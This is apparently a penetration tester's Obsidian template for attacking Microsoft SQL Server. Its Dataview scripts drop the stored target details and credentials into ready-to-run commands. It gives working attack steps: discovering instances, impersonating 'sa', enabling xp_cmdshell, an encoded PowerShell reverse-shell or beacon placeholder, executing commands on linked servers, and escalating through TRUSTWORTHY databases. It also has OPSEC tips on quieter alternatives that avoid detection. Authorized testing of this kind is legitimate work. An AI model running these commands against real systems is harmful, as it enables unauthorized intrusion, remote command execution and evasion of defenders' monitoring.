---
# Attack-specific fields
mssql_target_ip:
mssql_target_fqdn:
mssql_port: 1433
mssql_instance:
mssql_username:
mssql_password:
mssql_linked_server:
xp_cmdshell_enabled: false
notes:
---

# MS SQL Attacks

> [!abstract] Attack Summary
> SQL Server is frequently misconfigured with excessive privileges. Attacks include: discovering instances, **xp_cmdshell** for OS command execution, **impersonation** of other SQL logins, **linked server** traversal, and privilege escalation via public role permissions.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["MSSQL Target IP",     `\`INPUT[text(defaultValue("${p.mssql_target_ip || b?.target_ip || ''}")):mssql_target_ip]\``],
  ["MSSQL Target FQDN",   `\`INPUT[text(defaultValue("${p.mssql_target_fqdn || b?.target_fqdn || ''}")):mssql_target_fqdn]\``],
  ["SQL Instance",        `\`INPUT[text(defaultValue("${p.mssql_instance || 'MSSQLSERVER'}")):mssql_instance]\``],
  ["SQL Username",        `\`INPUT[text(defaultValue("${p.mssql_username || b?.username || ''}")):mssql_username]\``],
  ["SQL Password",        `\`INPUT[text(defaultValue("${p.mssql_password || b?.password || ''}")):mssql_password]\``],
  ["Linked Server Name",  `\`INPUT[text:mssql_linked_server]\``],
]);
```

---

## Step 1 — Discover SQL Servers

**Windows — PowerUpSQL**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain = b?.domain ?? "DOMAIN";
dv.paragraph("```powershell\n# Import PowerUpSQL\nImport-Module PowerUpSQL.ps1\n\n# Discover SQL instances on the domain\nGet-SQLInstanceDomain | Get-SQLServerInfo -Verbose\n\n# Find accessible SQL servers\nGet-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose\n```");
```

**Windows — Beacon + PowerUpSQL**
```dataviewjs
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\PowerUpSQL\\PowerUpSQL.exe Get-SQLInstanceDomain\nexecute-assembly C:\\Tools\\PowerUpSQL\\PowerUpSQL.exe Get-SQLConnectionTestThreaded\n```");
```

**Linux — NetExec**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain ?? "DOMAIN";
const dc_ip    = b?.dc_ip  ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
dv.paragraph("```bash\n# Discover MSSQL with auth\nnxc mssql " + dc_ip + "/24 -u '" + username + "' -p '" + password + "'\n\n# Or via LDAP\nnxc ldap " + dc_ip + " -u '" + username + "' -p '" + password + "' -M mssql_enum\n```");
```

MSSQL Target: `INPUT[text:mssql_target_ip]` / `INPUT[text:mssql_target_fqdn]`

---

## Step 2 — Connect and Enumerate

**Windows — PowerUpSQL**
```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const target   = p?.mssql_target_fqdn || "SQL_SERVER";
const instance = p?.mssql_instance || "MSSQLSERVER";
const username = p?.mssql_username || b?.username || "USER";
const password = p?.mssql_password || b?.password || "PASSWORD";
const domain   = b?.domain ?? "DOMAIN";
dv.paragraph("```powershell\n# Integrated Windows auth (current user)\nGet-SQLServerInfo -Verbose -Instance '" + target + "'\n\n# With explicit creds\nGet-SQLQuery -Instance '" + target + "' -Query 'SELECT @@version'\n\n# List logins and roles\nGet-SQLServerLoginDefaultPw -Instance '" + target + "'\nGet-SQLServerPriv -Instance '" + target + "'\n\n# Check sysadmin membership\nGet-SQLQuery -Instance '" + target + "' -Query \"SELECT name,is_sysadmin FROM sys.syslogins\"\n```");
```

**Linux — Impacket mssqlclient**
```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const target   = p?.mssql_target_ip  || "SQL_IP";
const username = p?.mssql_username   || b?.username || "USER";
const password = p?.mssql_password   || b?.password || "PASSWORD";
const domain   = b?.domain ?? "DOMAIN";
dv.paragraph("```bash\n# SQL auth\nimpacket-mssqlclient " + username + ":'" + password + "'@" + target + "\n\n# Windows auth (domain)\nimpacket-mssqlclient " + domain + "/" + username + ":'" + password + "'@" + target + " -windows-auth\n\n# With Kerberos\nexport KRB5CCNAME=ticket.ccache\nimpacket-mssqlclient -k " + domain + "/" + username + "@" + target + "\n\n# Useful queries once connected:\n# SELECT @@version\n# SELECT name FROM master.dbo.sysdatabases\n# SELECT name,is_sysadmin FROM sys.syslogins\n```");
```

---

## Step 3 — Impersonate SQL Logins

```dataviewjs
const p = dv.current();
const target = p?.mssql_target_fqdn || "SQL_SERVER";
dv.paragraph("```sql\n-- Find who you can impersonate\nSELECT distinct b.name FROM sys.server_permissions a\nINNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id\nWHERE a.permission_name = 'IMPERSONATE'\n\n-- Impersonate sa or sysadmin\nEXECUTE AS LOGIN = 'sa'\nSELECT SYSTEM_USER  -- verify impersonation\n\n-- Or with PowerUpSQL\n-- Invoke-SQLAuditPrivImpersonateLogin -Instance '" + target + "'\n```");
```

---

## Step 4 — Enable and Use xp_cmdshell

```dataviewjs
dv.paragraph("```sql\n-- Check if enabled\nSELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'\n\n-- Enable xp_cmdshell (requires sysadmin or appropriate permissions)\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\n\n-- Test execution\nEXEC xp_cmdshell 'whoami'\nEXEC xp_cmdshell 'net user'\n\n-- Get reverse shell or beacon callback\nEXEC xp_cmdshell 'powershell -enc BASE64_PAYLOAD'\n```");
```

**Impacket mssqlclient (inline)**
```dataviewjs
dv.paragraph("```bash\n# After connecting with impacket-mssqlclient:\nSQL> enable_xp_cmdshell\nSQL> xp_cmdshell whoami\nSQL> xp_cmdshell 'net user'\nSQL> xp_cmdshell 'powershell -enc BASE64_PAYLOAD'\n```");
```

---

## Step 5 — Traverse Linked Servers

```dataviewjs
const p = dv.current();
const linkedServer = p?.mssql_linked_server || "LINKED_SERVER";
dv.paragraph("```sql\n-- Discover linked servers\nSELECT srvname,isremote FROM sysservers\n\n-- Query linked server\nSELECT * FROM OPENQUERY([" + linkedServer + "], 'SELECT @@servername, @@version')\n\n-- Execute commands on linked server (if sysadmin there)\nEXECUTE ('sp_configure ''show advanced options'', 1; RECONFIGURE; sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [" + linkedServer + "]\nEXECUTE ('EXEC xp_cmdshell ''whoami''') AT [" + linkedServer + "]\n\n-- PowerUpSQL traversal\n-- Get-SQLServerLinkCrawl -Instance 'SQL_SERVER' -Verbose\n```");
```

Linked server: `INPUT[text:mssql_linked_server]`

---

## Step 6 — Privilege Escalation via SQL

```dataviewjs
dv.paragraph("```sql\n-- Check current privs\nSELECT entity_name, permission_name FROM fn_my_permissions(NULL, 'SERVER')\n\n-- Check if you can become sysadmin via trustworthy database\nSELECT name, is_trustworthy_on FROM sys.databases WHERE is_trustworthy_on = 1\n\n-- Abuse TRUSTWORTHY + db_owner role\nUSE TrustwortyDB\nEXEC dbo.sp_executesql N'EXEC master..xp_cmdshell ''whoami'''\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - `xp_cmdshell` usage is logged in the SQL error log and Windows event log.
> - Linked server queries appear in SQL profiler traces.
> - MSSQL process spawning child processes (cmd.exe, powershell.exe) is anomalous.
> - **Event 4688** — process creation from sqlservr.exe.
> - Consider using **CLR assemblies** or **OLE Automation** as alternatives to xp_cmdshell.

---

## Notes & Results

`INPUT[textarea:notes]`
